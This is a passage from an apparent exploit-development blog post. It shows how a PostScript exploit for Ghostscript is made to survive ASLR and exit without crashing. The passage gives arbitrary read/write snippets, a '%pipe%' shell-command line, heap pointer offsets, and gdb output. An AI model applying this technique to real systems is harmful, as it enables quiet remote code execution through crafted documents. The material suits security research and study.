<p>Great, the next step was to write Postscript after the command execution to get Ghostscript to exit gracefully. The exploit author has already defined custom function <code>ptradd</code>, <code>copystr</code>, <code>arbwr</code>, and <code>arbrd</code>. The first step is getting a variable to store the pointer to where I want to write which is <code>0x7ffff3688008</code>. I can use the <code>ptradd</code> function to do this but I have no idea what to add to or how much to add since I don&rsquo;t know what some of the other variables such as <code>head</code> and <code>next</code> when it was disabling the flag.</p>
<p>Since the first pointer in that hexdump is at <code>0x7ffff3688010</code>, I decided to try to get a Postscript variable to hold that address. After lots of searching in gdb, I found all pointer chains that led to that address:</p>
<pre tabindex="0"><code>0x5555579bf478 —▸ 0x555557c1f6d0 —▸ 0x555557af9030 —▸ 0x555557a14c80 —▸ 0x555557af8e30 —▸ 0x555557af82e0 —▸ 0x555557af81e0 —▸ 0x7ffff3688010

0x555557af9038 —▸ 0x555557c1f6d0 —▸ 0x555557af9030 —▸ 0x555557a14c80 —▸ 0x555557af8e30 —▸ 0x555557af82e0 —▸ 0x555557af81e0 —▸ 0x7ffff3688010

0x7ffff3688018 —▸ 0x555557af81e0 —▸ 0x7ffff3688010

0x555557af8f38 —▸ 0x7ffff3688010
</code></pre><p>Now I needed to check if any of the Postscript vairables in the exploit were pointing to any of these addresses after overwriting the flag. Sadly, none of the variables were pointing to any of these addresses. If you remmeber from the previoud article, I printed out the entire linked list of the malloc chunk header that the exploit traverses to disable the flag. The string that the exploit is looking for <code>gs_lib_ctx_init(core)</code> ends up being in the third to last malloc chunk in the linked list, which leaves <code>head</code> pointing to the third to last malloc chunk header pointer in the linked list and <code>next</code> pointing to the second to last.</p>
<img src="./Images/last_nodes.jpg" alt="showing the last nodes in the linked list" style="display:block; margin:auto;">
<p>This is corroborated by the fact that the values of <code>next</code> and <code>head</code> are the correct pointers <code>0x5555579bf520</code> and <code>0x5555579bf610</code> respectively:</p>
<img src="./Images/print_ps_vars.jpg" alt="showing the values of each variable defined in the exploit" style="display:block; margin:auto;">
<p>After no luck of having any of the variables be a pointer I needed, I went back to looking at the malloc chunk header linked list. I noticed that the value of <code>0x5555579bf4b0</code> of the last chunk or the value of <code>next</code> of the penultimate chunk is close to the value of the first pointer in the first pointer chain from earlier (<code>0x5555579bf478</code>). I tested with ASLR on and off and the difference between these two values is always <code>0x38</code> which means I can reliably use it. So I added to the exploit code to iterate through the linked list once more which gets <code>next</code> to point to <code>0x5555579bf478</code>. After that I call <code>ptradd</code> on <code>next</code> to add <code>-56</code> to it which gets me to the address <code>0x5555579bf4b0</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="s">(%pipe%ls)</span> <span class="s">(w)</span> <span class="nf">file</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s">(done)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl"><span class="c1">%{ 1 pop } loop
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">/head</span> <span class="nf">next</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">head</span> <span class="nf">next</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr3</span> <span class="nf">next</span> <span class="mf">-56</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span></code></pre></div><img src="./Images/next_after_ptradd.jpg" alt="showing the value of next after ptradd" style="display:block; margin:auto;">
<p>After getting <code>next</code> to hold the first pointer in the chain, I just need to walk the pointer chain and keep dereferencing the pointer until I reach the pointer that points to the overflowed address. As a reminder this is the pointer chain I&rsquo;m walking:</p>
<pre tabindex="0"><code>0x5555579bf478
      ↓
0x555557c1f6d0
      ↓
0x555557af9030
      ↓
0x555557a14c80
      ↓
0x555557af8e30
      ↓
0x555557af82e0
      ↓
0x555557af81e0
      ↓
0x7ffff3688010
</code></pre><p>A simple for loop in Postscript similar to the one used to walk the malloc chunk header linked list works:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/ptr3</span> <span class="nf">next</span> <span class="mf">-56</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/buf2</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">8</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">ptr3</span> <span class="nf">buf2</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr3</span> <span class="nf">buf2</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">repeat</span>
</span></span></code></pre></div><img src="./Images/p_ptr3_buf2.jpg" alt="showing the value of ptr3 and buf2 after walking the pointer chain" style="display:block; margin:auto;">

<h3 class="relative group">Writing to the Address 
    <div id="writing-to-the-address" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#writing-to-the-address" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Great, now I have a Postscript variable <code>ptr3</code> and <code>buf2</code> that holds the address of where to write to. Next is figuring out what to write. Easy, for now I can just copy what the hexdump showed was there before the overflow, and then do this for all 5 pointers plus the 3 clumps of bytes in between using the <code>ptradd</code> and <code>arbwr</code> functions. There was probably a better way to do this but I just wanted to get it working:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nf">ptr3</span> <span class="p">&lt;</span><span class="nf">308faf5755550000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr4</span> <span class="nf">ptr3</span> <span class="mf">-8</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr4</span> <span class="p">&lt;</span><span class="nf">02504c0000000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr5</span> <span class="nf">ptr3</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr5</span> <span class="p">&lt;</span><span class="nf">784b4c0000000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr6</span> <span class="nf">ptr3</span> <span class="mf">24</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr6</span> <span class="p">&lt;</span><span class="nf">00ba025755550000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr7</span> <span class="nf">ptr3</span> <span class="mf">32</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr7</span> <span class="p">&lt;</span><span class="nf">71b6e65655550000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr8</span> <span class="nf">ptr3</span> <span class="mf">72</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr8</span> <span class="p">&lt;</span><span class="nf">01000000504b4c00</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr9</span> <span class="nf">ptr3</span> <span class="mf">80</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr9</span> <span class="p">&lt;</span><span class="mf">6064035755550000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span></code></pre></div><p>Since <code>ptr3</code> held the address <code>0x7ffff3688008</code>, I just used <code>ptradd</code> to add the correct offset to get the other memory locations to write to. After this, I ran the exploit to completion in gdb:</p>
<img src="./Images/fix_crash_no_aslr.jpg" alt="showing the output of the exploit after fixing the crash" style="display:block; margin:auto;">
<p>I added some print statements in there for debugging purposes but what does that second to last line say?</p>
<p><code>Error: finalizing subclassing device while child refcount &gt; 1</code></p>
<p>This is a new error that I haven&rsquo;t seen before and its weird that it shows up now but it didn&rsquo;t when I manually set the memory back to what it was before the overflow using gdb. Regardless, the program did not crash and exited gracefully. Also I should mention, even though I iterated once more in the malloc chunk header linked list, I actually could have just used the <code>head</code> or <code>next</code> variable since they were already close and at the same offset away. The reason I didn&rsquo;t do this was I had thought that the <code>ptradd</code> function only worked for adding or subtracting at most a byte in which I could have just called <code>ptradd</code> in a loop to get the desired pointer. This is why I searched for a pointer that was closer to the address but its too late now.</p>

<h2 class="relative group">Turning ASLR On 
    <div id="turning-aslr-on" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#turning-aslr-on" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Although I achieved my goal of getting Ghosscript to not crash, it&rsquo;s still not usable since this is all done with ASLR off. The next step was obvious, stop hardcoding the 5 pointers and figure out what they were before the overflow. The custom defined functions <code>copystr</code>, <code>ptradd</code>, <code>arbwr</code>, and <code>arbrd</code> don&rsquo;t work until the overflow happens since they work on strings and the overflow is what allows me to write to arbitrary memory since it changes the type of <code>OBJARR</code> to a string. This means that there is no way of determining the values of the 5 pointers before the overflow happens and I had to figure out what they were after the overflow. I tried searching for the values of the pointers in gdb after the overflow and I couldn&rsquo;t find a single thing, not even one pointer.</p>
<p>It was at this point I thought about just leaving it at that and having this be a ASLR off exploit. But something told me that this was still possible so I kept digging and I&rsquo;m glad I did. I went back to the hexdump before and after the overflow to see if there was anything similar that I was missing and that&rsquo;s when I saw it:</p>
<p><strong>Before:</strong>
<img src="./Images/hexdump_before.jpg" alt="showing hexdump of the data between the end of SOURCE1 and start of SOURCE2 before the buffer overflow" style="display:block; margin:auto;"></p>
<p><strong>After:</strong>
<img src="./Images/hexdump_after.jpg" alt="showing hexdump of the data between the end of SOURCE1 and start of SOURCE2 after the buffer overflow" style="display:block; margin:auto;"></p>
<p>Although none of the pointers in the hexdump after were originally in the hexdump before, there is a pointer in the after hexdump that is very close to one in the before hexdump. The pointer at address <code>0x7ffff3688018</code> before the overwrite is also at <code>0x7ffff373efe0</code> after the overwrite but with a difference of <code>0x400</code>. I eagerly enabled ASLR to see if this was the case and the pointer was always <code>0x400</code> away each time. If I can read what&rsquo;s at that address, then I can easily get the value of the pointer to set it back.</p>
<p>Not only that, the values before the overwrite at addresses <code>0x7ffff3688010</code> (<code>0x555557af8f30</code>) and <code>0x7ffff3688018</code> (<code>0x555557af81e0</code>) are also always at a difference of <code>0xD50</code> away from eachother. So this means once I get the value at address <code>0x7ffff373efe0</code>, I can also set the value of the pointer that goes before it.</p>
<p>Now this is great an all, but theres still 3 more pointers that I need to figure out as well as the 3 clumps of bytes in between. Luckily I printed out whats at the addresses before the overflow and pwndbg easily resolves these pointers to symbols:</p>
<img src="./Images/telescope_before.jpg" alt="showing the values of pointers of the data between the end of SOURCE1 and start of SOURCE2 before the buffer overflow" style="display:block; margin:auto;">
<p>The two pointers at <code>0x7ffff3688010</code> and <code>0x7ffff3688018</code> are the ones I already mentioned. For the next two pointers, pwndbg resolves them as global variables <code>(st_bytes)</code> and <code>'large object clump'</code> which are also always at the same offset from the base address. The problem is that I don&rsquo;t know the base address, I can only arbitrarily read and write. So how am I going to figure out what this pointer is each time? Well, I printed out the memory that the hexdump after the overflow identifies and noticed something else useful:</p>
<img src="./Images/telescope_after.jpg" alt="showing the values of pointers of the data between the end of SOURCE1 and start of SOURCE2 after the buffer overflow" style="display:block; margin:auto;">
<p>Well thats not useful, the data got copied at a weird offset. Let&rsquo;s take a look at it shifted up 2 bytes:</p>
<img src="./Images/fixed_telescope_after.jpg" alt="showing the values of pointers of the data between the end of SOURCE1 and start of SOURCE2 after the buffer overflow with a 2 byte offset" style="display:block; margin:auto;">
<p>Well, <code>(st_bytes)</code> is present in the memory after the overflow so thats an easy fix. And although <code>'large object clump'</code> is not present, <code>'large_string_clump'</code> is which is now a known global variable. Since I now always know where <code>'large_string_clump'</code> is, I can just calculate the offset to <code>'large object clump'</code> which is <code>0x13</code>.</p>
<p>Theres one more pointer left, the one at <code>0x7ffff3688060</code> which pwndbg resolves to <code>(st_refs)</code>. I can use the same trick I did to get the address of <code>'large object clump'</code> using the address of <code>(st_bytes)</code>. The difference between the two is <code>0xAA60</code>.</p>
<p>Now that all 5 pointers have been identified and I have a way of getting their values, the next thing is to figure out what those 3 clumps of bytes are in between the pointers. This turned out to be very easy as first clump of bytes is <code>0x4c5002</code>, and when I checked with ASLR that value was always the same so I can just harcode it. The next clump of bytes is <code>0x4c4b78</code> which is also always the same like the first clump. And the same thing goes for the last clump of bytes which is <code>4c4b5000000001</code>. I don&rsquo;t know what these values are for or what they represent, I just know that they are always the same so I can just hardcode them in the exploit.</p>
<p>There is one more interesting finding before I begin showing how I fixed the exploit. For some reason, the pointer <code>0x555557af81e0</code> seems to reappear after the overflow at address <code>0x7ffff3688018</code> which is where it was before the overflow. I don&rsquo;t know why this is the case or when this happens but now I can use it instead of grabbing that same pointer at <code>0x7ffff373efe0</code> and subtracting <code>0x400</code> from it</p>
<img src="./Images/pointer_reappear.jpg" alt="showing the pointer at 0x7ffff3688018 after the overflow" style="display:block; margin:auto;">
<p>The first thing I did was get the reappeared pointer at <code>0x7ffff3688018</code> and subtract <code>0xD50</code> from it to get the pointer at <code>0x7ffff3688010</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/ptr4</span> <span class="nf">ptr3</span> <span class="mf">8</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/buf3</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr4</span> <span class="nf">buf3</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/buf4</span> <span class="nf">buf3</span> <span class="mf">3408</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">ptr3</span> <span class="nf">buf4</span> <span class="nf">arbwr</span>
</span></span></code></pre></div><p>First, <code>ptr3</code> holds the value of the address <code>0x7ffff3688010</code> or the first pointer in the hexdump after the overflow. Then I set <code>ptr4</code> to <code>ptr3 + 8</code> which is <code>0x7ffff3688018</code>. A new variable <code>buf3</code> is created and hold the pointer at <code>ptr4</code> using <code>arbrd</code>. Now that <code>buf3</code> holds the pointer at <code>0x7ffff3688018</code>, I can use <code>ptradd</code> to add <code>0xD50</code> to <code>buf3</code> to get the pointer at <code>0x7ffff3688010</code> and store it in <code>buf4</code>. Finally, I write the value of <code>buf4</code> to <code>ptr3</code> which is the first pointer in the hexdump after the overflow.</p>
<p>The next step is to fix the two memory clumps before and after those two pointers which is straightforward:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/ptr5</span> <span class="nf">ptr3</span> <span class="mf">-8</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr5</span> <span class="p">&lt;</span><span class="nf">02504c0000000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr6</span> <span class="nf">ptr3</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr6</span> <span class="p">&lt;</span><span class="nf">784b4c0000000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span></code></pre></div><p>This just subtracts 8 and adds 16 to <code>ptr3</code> to get the addresses of the two clumps of bytes and writes the values to them since they are always the same.</p>
<p>The next step is to set <code>(st_bytes)</code> and <code>('large object clump')</code> to the correct values. Both follow the same pattern:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/ptr7</span> <span class="nf">ptr3</span> <span class="mf">24</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/buf5</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr3</span> <span class="mf">749546</span> <span class="nf">ptradd</span> <span class="nf">buf5</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr7</span> <span class="nf">buf5</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/ptr8</span> <span class="nf">ptr3</span> <span class="mf">32</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/buf6</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr3</span> <span class="mf">749554</span> <span class="nf">ptradd</span> <span class="nf">buf6</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr8</span> <span class="nf">buf6</span> <span class="mf">19</span> <span class="nf">ptradd</span> <span class="nf">arbwr</span>
</span></span></code></pre></div><p>Again I add from <code>ptr3</code> to get the addresses of the two pointers to write to. Then I read the value at <code>ptr3 + 749546</code> which is the address of <code>(st_bytes)</code> at <code>0x7ffff373effa</code>, store it in <code>buf5</code>, and write it to <code>ptr7</code>. The same thing is done for but this time it gets the address of <code>'large string clump'</code> at <code>0x7ffff373f002</code> and stores it in <code>buf6</code>. After that I add <code>0x13</code> to <code>buf6</code> to get the address of <code>'large object clump'</code> and then write it to <code>ptr8</code>.</p>
<p>Then I fix the last clump of bytes at <code>0x7ffff3688058</code> like before:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/ptr9</span> <span class="nf">ptr3</span> <span class="mf">72</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr9</span> <span class="p">&lt;</span><span class="nf">01000000504b4c00</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span></code></pre></div><p>The last thing to do is set <code>(st_refs)</code> to the correct value which I do by getting the address of <code>(st_bytes)</code> and adding <code>0xAA60</code> to it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nv">/ptr10</span> <span class="nf">ptr3</span> <span class="mf">80</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">ptr10</span> <span class="nf">buf5</span> <span class="mf">43616</span> <span class="nf">ptradd</span> <span class="nf">arbwr</span>
</span></span></code></pre></div><p>I used <code>buf5</code> since it already holds the address of <code>(st_bytes)</code>.</p>
<p>Now if I test the exploit with ASLR on, it works!</p>
<img src="./Images/still_error.jpg" alt="showing the output of the exploit with ASLR on" style="display:block; margin:auto;">
<p>But I stil get the same refcount error as before. My first thought was can I overwrite a function pointer so that Ghostscript just terminates without even getting the chance to show me the error? I quickly scraped that idea. I wasn&rsquo;t sure if this was being printed because I compiled Ghostscript with debug symbols or if it was actually an error so I investigated it. If I try to run the exploit but with the Postscript file in a different directory, instead of a refcount error I get a segfault:</p>
<img src="./Images/segfault_final.jpg" alt="showing the output of the exploit with a segfault instead of the refcount error" style="display:block; margin:auto;">

<h2 class="relative group">Fixing the Refcount Error 
    <div id="fixing-the-refcount-error" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#fixing-the-refcount-error" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>I found the line where the error was being printed in:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">0</span>  <span class="nf">restore_finalize</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x5555579c2248</span><span class="p">)</span> <span class="n">at</span> <span class="p">.</span><span class="o">/</span><span class="n">psi</span><span class="o">/</span><span class="n">isave</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">954</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span>  <span class="mh">0x0000555556392e7a</span> <span class="n">in</span> <span class="nf">alloc_restore_all</span> <span class="p">(</span><span class="n">i_ctx_p</span><span class="o">=</span><span class="mh">0x5555579f34a8</span><span class="p">)</span> <span class="n">at</span> <span class="p">.</span><span class="o">/</span><span class="n">psi</span><span class="o">/</span><span class="n">isave</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">899</span>
</span></span><span class="line"><span class="cl"><span class="mi">2</span>  <span class="mh">0x000055555632a46d</span> <span class="n">in</span> <span class="nf">gs_main_finit</span> <span class="p">(</span><span class="n">minst</span><span class="o">=</span><span class="mh">0x5555579bfd90</span><span class="p">,</span> <span class="n">exit_status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">env_code</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="n">at</span> <span class="p">.</span><span class="o">/</span><span class="n">psi</span><span class="o">/</span><span class="n">imain</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">1407</span>
</span></span><span class="line"><span class="cl"><span class="mi">3</span>  <span class="mh">0x000055555632a772</span> <span class="n">in</span> <span class="nf">gs_to_exit_with_code</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x5555579bf390</span><span class="p">,</span> <span class="n">exit_status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="n">at</span> <span class="p">.</span><span class="o">/</span><span class="n">psi</span><span class="o">/</span><span class="n">imain</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">1450</span>
</span></span><span class="line"><span class="cl"><span class="mi">4</span>  <span class="mh">0x000055555632a79d</span> <span class="n">in</span> <span class="nf">gs_to_exit</span> <span class="p">(</span><span class="n">mem</span><span class="o">=</span><span class="mh">0x5555579bf390</span><span class="p">,</span> <span class="n">exit_status</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="n">at</span> <span class="p">.</span><span class="o">/</span><span class="n">psi</span><span class="o">/</span><span class="n">imain</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">1455</span>
</span></span><span class="line"><span class="cl"><span class="mi">5</span>  <span class="mh">0x000055555633100d</span> <span class="n">in</span> <span class="nf">psapi_exit</span> <span class="p">(</span><span class="n">ctx</span><span class="o">=</span><span class="mh">0x5555579bf550</span><span class="p">)</span> <span class="n">at</span> <span class="p">.</span><span class="o">/</span><span class="n">psi</span><span class="o">/</span><span class="n">psapi</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">517</span>
</span></span><span class="line"><span class="cl"><span class="mi">6</span>  <span class="mh">0x000055555646b84c</span> <span class="n">in</span> <span class="nf">gsapi_exit</span> <span class="p">(</span><span class="n">instance</span><span class="o">=</span><span class="mh">0x5555579bf550</span><span class="p">)</span> <span class="n">at</span> <span class="p">.</span><span class="o">/</span><span class="n">psi</span><span class="o">/</span><span class="n">iapi</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">440</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span>  <span class="mh">0x000055555581419d</span> <span class="n">in</span> <span class="nf">main</span> <span class="p">(</span><span class="n">argc</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">argv</span><span class="o">=</span><span class="mh">0x7fffffffe2f8</span><span class="p">)</span> <span class="n">at</span> <span class="p">.</span><span class="o">/</span><span class="n">psi</span><span class="o">/</span><span class="n">gs</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">122</span>
</span></span></code></pre></div><p>This happens in the <code>restore_finalize</code> function in <code>isave.c</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// /psi/isave.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Finalize objects that will be freed by a restore.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Note that we must temporarily disable the freeing operations
</span></span></span><span class="line"><span class="cl"><span class="cm"> * of the allocator while doing this.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="mi">937</span> <span class="k">static</span> <span class="kt">void</span>
</span></span><span class="line"><span class="cl"><span class="mi">938</span> <span class="nf">restore_finalize</span><span class="p">(</span><span class="kt">gs_ref_memory_t</span> <span class="o">*</span> <span class="n">mem</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">939</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">940</span>     <span class="kt">clump_t</span> <span class="o">*</span><span class="n">cp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">941</span>     <span class="n">clump_splay_walker</span> <span class="n">sw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">942</span> 
</span></span><span class="line"><span class="cl"><span class="mi">943</span>     <span class="nf">alloc_close_clump</span><span class="p">(</span><span class="n">mem</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">944</span>     <span class="nf">gs_enable_free</span><span class="p">((</span><span class="kt">gs_memory_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">mem</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">945</span>     <span class="k">for</span> <span class="p">(</span><span class="n">cp</span> <span class="o">=</span> <span class="nf">clump_splay_walk_bwd_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sw</span><span class="p">,</span> <span class="n">mem</span><span class="p">);</span> <span class="n">cp</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">cp</span> <span class="o">=</span> <span class="nf">clump_splay_walk_bwd</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sw</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">946</span>         <span class="nf">SCAN_CLUMP_OBJECTS</span><span class="p">(</span><span class="n">cp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">947</span>              <span class="n">DO_ALL</span>
</span></span><span class="line"><span class="cl"><span class="mi">948</span>             <span class="nf">struct_proc_finalize</span><span class="p">((</span><span class="o">*</span><span class="n">finalize</span><span class="p">))</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="mi">949</span>             <span class="n">pre</span><span class="o">-&gt;</span><span class="n">o_type</span><span class="o">-&gt;</span><span class="n">finalize</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">950</span>         <span class="k">if</span> <span class="p">(</span><span class="n">finalize</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">951</span>             <span class="nf">if_debug2m</span><span class="p">(</span><span class="sc">&#39;u&#39;</span><span class="p">,</span> <span class="p">(</span><span class="kt">gs_memory_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">,</span> <span class="s">&#34;[u]restore finalizing %s &#34;</span><span class="n">PRI_INTPTR</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mi">952</span>                        <span class="nf">struct_type_name_string</span><span class="p">(</span><span class="n">pre</span><span class="o">-&gt;</span><span class="n">o_type</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="mi">953</span>                        <span class="p">(</span><span class="kt">intptr_t</span><span class="p">)</span> <span class="p">(</span><span class="n">pre</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="mi">954</span>             <span class="p">(</span><span class="o">*</span><span class="n">finalize</span><span class="p">)</span> <span class="p">((</span><span class="kt">gs_memory_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">mem</span><span class="p">,</span> <span class="n">pre</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">955</span>         <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mi">956</span>         <span class="n">END_OBJECTS_SCAN</span>
</span></span><span class="line"><span class="cl"><span class="mi">957</span>     <span class="p">}</span>
